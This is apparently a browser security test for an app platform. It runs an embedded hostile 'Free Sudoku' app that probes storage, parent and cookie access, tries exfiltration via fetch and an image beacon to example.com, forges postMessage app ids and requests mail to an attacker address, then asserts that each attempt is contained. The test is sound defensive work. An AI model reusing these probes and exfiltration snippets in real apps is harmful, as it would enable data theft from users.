/* "What if an app had access to all data on the cloud?"

   A published app is a stranger's HTML running on our page, and since it got
   cloud storage the question stopped being theoretical. This runs a
   deliberately HOSTILE app and measures what it can actually reach, rather
   than asserting the containment from reading the source.

   The design rests on two things, and both are tested here by attacking them:

     1. The iframe has no `allow-same-origin`, so it is a unique opaque origin.
        Its localStorage is not ours, `parent.anything` throws, and there is no
        route to the account hash — which matters more than anything else here,
        because that hash IS the decryption key for the account's whole cloud
        state. An app that got it would not need our cooperation for anything.

     2. The app id used for cloud reads and writes is stamped on the HOST at
        registration time and is never read out of the message. The app can ask
        for whatever it likes; it gets its own drawer.

   What an app CAN do, stated plainly so nobody is surprised by it: read and
   write its OWN (app, room) key-value rows, which by design include rows
   written by other people using the same app in the same room. That is what
   multiplayer is. It is plaintext to the server. It is not the account state,
   not chat, not mail, and not another app's data.

   Run: NODE_PATH=/opt/node22/lib/node_modules node tools/tests/hostileapp_test.cjs */
const {chromium}=require('/opt/node22/lib/node_modules/playwright');
const path=require('path'),url=require('url');

let pass=0,fail=0;
const ok=(n,c,x)=>{c?pass++:fail++;console.log((c?'PASS ':'FAIL ')+n+(x!==undefined&&!c?'  -- '+String(x).slice(0,300):''));};

/* The attacker. Every probe is wrapped so one SecurityError can't end the run
   before the later probes report — a half-finished report would read as a pass. */
const HOSTILE=`<!doctype html><html><head><title>Free Sudoku</title></head><body>
<script>
var out={};
function probe(name,fn){ try{ out[name]={ok:true,val:String(fn()).slice(0,120)}; }
                         catch(e){ out[name]={ok:false,val:String(e&&e.name||e).slice(0,80)}; } }

probe('localStorage',      function(){ return localStorage.length+' keys, kindlehub_v5='+localStorage.getItem('kindlehub_v5'); });
probe('cookie',            function(){ return document.cookie||'(empty)'; });
probe('parent.S',          function(){ return JSON.stringify(parent.S).slice(0,60); });
probe('parent.localStorage',function(){ return parent.localStorage.getItem('kindlehub_v5'); });
probe('top.location',      function(){ return top.location.href; });
probe('parent.document',   function(){ return parent.document.body.innerHTML.length; });
probe('window.open',       function(){ var w=window.open('https://example.com'); return w?'opened':'null'; });

/* Exfiltration attempts. Both are async, so they report by mutating out. */
out.fetch={ok:null,val:'pending'};
try{ fetch('https://example.com/steal').then(function(){out.fetch={ok:true,val:'request went out'};},
                                            function(e){out.fetch={ok:false,val:String(e&&e.name||e).slice(0,60)};}); }
catch(e){ out.fetch={ok:false,val:'threw '+(e&&e.name)}; }

out.imgBeacon={ok:null,val:'pending'};
try{ var im=new Image(); im.onload=function(){out.imgBeacon={ok:true,val:'beacon loaded'};};
     im.onerror=function(){out.imgBeacon={ok:false,val:'blocked'};};
     im.src='https://example.com/p.gif?d='+encodeURIComponent('stolen'); }
catch(e){ out.imgBeacon={ok:false,val:'threw'}; }

/* The bridge. Claim to be a different app, and separately try with no nonce. */
window.addEventListener('message',function(ev){
  var d=ev&&ev.data; if(!d||d.kh!=='app')return;
  out['reply_'+d.action]={ok:!!d.ok,by:d.by,me:d.me,rows:d.rows,
                          val:JSON.stringify(d).slice(0,160)};
});
function ask(o){ try{ parent.postMessage(o,'*'); }catch(e){} }
/* Forged app id + forged room, with a VALID nonce — the interesting case. */
ask({kh:'app',action:'cloudGet',app:'victim-app',appId:'victim-app',p_app:'victim-app',
     room:'main',key:'secret',rid:'forge',nonce:window.KH_APP_NONCE});
/* No nonce at all — should be ignored outright. */
ask({kh:'app',action:'cloudList',room:'main',rid:'nononce'});
/* And the one that would end the game if it worked. */
ask({kh:'app',action:'sendMail',to:'attacker@example.com',subject:'x',body:'y',rid:'mail',nonce:window.KH_APP_NONCE});

setTimeout(function(){ parent.postMessage({khTest:true,out:out},'*'); },1200);
<\/script></body></html>`;

(async()=>{
  const b=await chromium.launch({executablePath:'/opt/pw-browsers/chromium'});
  const p=await b.newPage({viewport:{width:600,height:800}});
  const errs=[];p.on('pageerror',e=>errs.push(String(e)));
  await p.addInitScript(()=>{ try{localStorage.setItem('kh_onboarded','1');}catch(_){} });
  await p.goto(url.pathToFileURL(path.resolve(__dirname,'../../index.min.html')).href,{waitUntil:'domcontentloaded'});
  await p.waitForFunction(()=>window._KH&&window._KH.S,null,{timeout:25000});

  /* Sign in far enough for the bridge to try a call, and record every RPC the
     host makes on the app's behalf instead of letting it hit the network. That
     recording is the actual evidence for the app-id claim: it shows what the
     HOST sent, not what the app asked for. */
  await p.evaluate(()=>{
    window._KH.S.authToken='f'.repeat(64);
    window.__rpc=[];
    /* The server answers with `author` = the first 32 hex of the ACCOUNT HASH.
       Hand that back verbatim and see whether the app ever gets to see it. */
    window.__RAW_AUTHOR='f'.repeat(32);
    window._khRpcCallEx=function(fn,payload){
      window.__rpc.push({fn:fn,payload:payload});
      return Promise.resolve({ok:true,data:{v:'x',by:window.__RAW_AUTHOR,
        rows:[{k:'a',v:'1',at:'',by:window.__RAW_AUTHOR}]}});
    };
    window.__mailAsked=false;
    window.kindleConfirm=function(msg,cb){ window.__mailAsked=String(msg); cb(false); };
    window.__report=null;
    window.addEventListener('message',function(ev){
      if(ev&&ev.data&&ev.data.khTest)window.__report=ev.data.out;
    },false);
  });

  /* Open it exactly the way a user would: a published app in the catalogue. */
  await p.evaluate((html)=>{
    window._KH.S.publishedApps=[{id:'hostile-1',name:'Free Sudoku',html:html,cat:'Games',isGame:true}];
    window._khOpenPublishedApp(window._KH.S.publishedApps[0]);
  }, HOSTILE);

  await p.waitForFunction(()=>window.__report,null,{timeout:15000});
  const r=await p.evaluate(()=>({out:window.__report,rpc:window.__rpc,mail:window.__mailAsked}));
  const o=r.out;
  const shown=k=>o[k]?((o[k].ok?'REACHED ':'blocked ')+o[k].val):'(no result)';

  console.log('\n── what the hostile app reached ──');
  for(const k of Object.keys(o))console.log('   '+k.padEnd(20)+shown(k));
  console.log('\n── what the host sent on its behalf ──');
  console.log('   '+JSON.stringify(r.rpc));

  console.log('\n── 1. the account hash and everything it decrypts ──');
  ok('the app cannot read our localStorage',        o.localStorage && o.localStorage.ok===false, shown('localStorage'));
  ok('...nor reach it through parent',              o['parent.localStorage'] && o['parent.localStorage'].ok===false, shown('parent.localStorage'));
  ok('...nor read the host page state object',      o['parent.S'] && o['parent.S'].ok===false, shown('parent.S'));
  ok('...nor read the host DOM',                    o['parent.document'] && o['parent.document'].ok===false, shown('parent.document'));
  ok('...nor read the page URL (no ?hash= leak)',   o['top.location'] && o['top.location'].ok===false, shown('top.location'));
  ok('...and gets no cookies',                      o.cookie && (o.cookie.ok===false || o.cookie.val==='(empty)'), shown('cookie'));

  console.log('\n── 2. it cannot send anything anywhere ──');
  ok('fetch to an outside host is blocked',         o.fetch && o.fetch.ok===false, shown('fetch'));
  ok('an <img> beacon is blocked too',              o.imgBeacon && o.imgBeacon.ok===false, shown('imgBeacon'));
  ok('it cannot open a window to carry data out',   o['window.open'] && (o['window.open'].ok===false || o['window.open'].val==='null'), shown('window.open'));

  console.log('\n── 3. the bridge gives it its OWN drawer, whatever it claims ──');
  const gets=r.rpc.filter(x=>x.fn==='kh_app_get');
  ok('the forged read did reach the host',          gets.length===1, JSON.stringify(r.rpc));
  ok('...but was scoped to the frame\'s own app id', gets.length===1 && gets[0].payload.p_app==='hostile-1', gets[0]&&gets[0].payload.p_app);
  ok('...NOT the app id it asked for',              gets.length===1 && gets[0].payload.p_app!=='victim-app');
  ok('...and the account hash was added by the host', gets.length===1 && gets[0].payload.p_hash==='f'.repeat(64));
  ok('a request with no nonce is ignored entirely', r.rpc.filter(x=>x.fn==='kh_app_list').length===0, JSON.stringify(r.rpc));

  console.log('\n── 4. the id it learns about a person is app-local ──');
  const g=o.reply_cloudGet||{};
  const rowBy=(g.rows&&g.rows[0]&&g.rows[0].by)||'';
  ok('the raw account-derived author never reaches the app', !/f{32}/.test(JSON.stringify(g)), JSON.stringify(g));
  ok('...it still gets SOME stable name for the writer',     /^[0-9a-f]{8,}$/.test(String(g.by||'')), String(g.by));
  ok('...on the listed rows too',                            /^[0-9a-f]{8,}$/.test(rowBy), rowBy);
  ok('...and is told which one is itself',                   /^[0-9a-f]{8,}$/.test(String(g.me||'')), String(g.me));
  /* Two apps must not be able to agree they saw the same person. */
  const pair=await p.evaluate(async()=>{
    const one=(id)=>new Promise(res=>{
      const f=document.createElement('iframe');
      f.setAttribute('sandbox','allow-scripts');
      document.body.appendChild(f);
      const n=window._khRegisterAppFrame(f,id);
      /* The bridge answers the CHILD, not us, so the child forwards it back
         under its own marker. Filtering the parent's inbox for kh:'app' would
         only ever catch the child's outgoing request. */
      window.addEventListener('message',function h(ev){
        if(ev.source===f.contentWindow&&ev.data&&ev.data.khPair===id){
          window.removeEventListener('message',h);res(ev.data.reply);
        }
      });
      f.srcdoc='<script>window.addEventListener("message",function(e){'+
        'if(e.data&&e.data.kh==="app")parent.postMessage({khPair:'+JSON.stringify(id)+
        ',reply:e.data},"*");});'+
        'parent.postMessage({kh:"app",action:"cloudGet",key:"k",rid:'+
        JSON.stringify(id)+',nonce:'+JSON.stringify(n)+'},"*");<\/script>';
    });
    return [await one('app-alpha'), await one('app-beta')];
  });
  const a=(pair[0]&&pair[0].me)||'', bb=(pair[1]&&pair[1].me)||'';
  ok('two different apps see DIFFERENT names for one person', !!a && !!bb && a!==bb, JSON.stringify(pair).slice(0,300));

  console.log('\n── 5. sending mail as the user needs the user ──');
  ok('the mail request asked the human first',      typeof r.mail==='string' && /wants to send an email/i.test(r.mail), String(r.mail).slice(0,90));
  ok('...and declining sent nothing',               o.reply_sendMail && o.reply_sendMail.ok===false, shown('reply_sendMail'));

  console.log('\n── 6. the guard is real, not incidental ──');
  const sb=await p.evaluate(()=>{
    const fs=document.querySelectorAll('iframe');
    for(const f of fs)if(f.srcdoc&&/Free Sudoku/.test(f.srcdoc))return f.getAttribute('sandbox')+' || '+/Content-Security-Policy/.test(f.srcdoc);
    return '(frame not found)';
  });
  ok('the frame has no allow-same-origin',          /^allow-/.test(sb) && !/allow-same-origin/.test(sb), sb);
  ok('...and no allow-popups',                      !/allow-popups/.test(sb), sb);
  ok('...and a CSP was injected into its document', /\|\| true$/.test(sb), sb);
  ok('no page errors',                              errs.length===0, errs.join(' | '));

  await b.close();
  console.log('\n'+pass+' passed, '+fail+' failed');
  process.exit(fail?1:0);
})().catch(e=>{console.error(e);process.exit(1);});
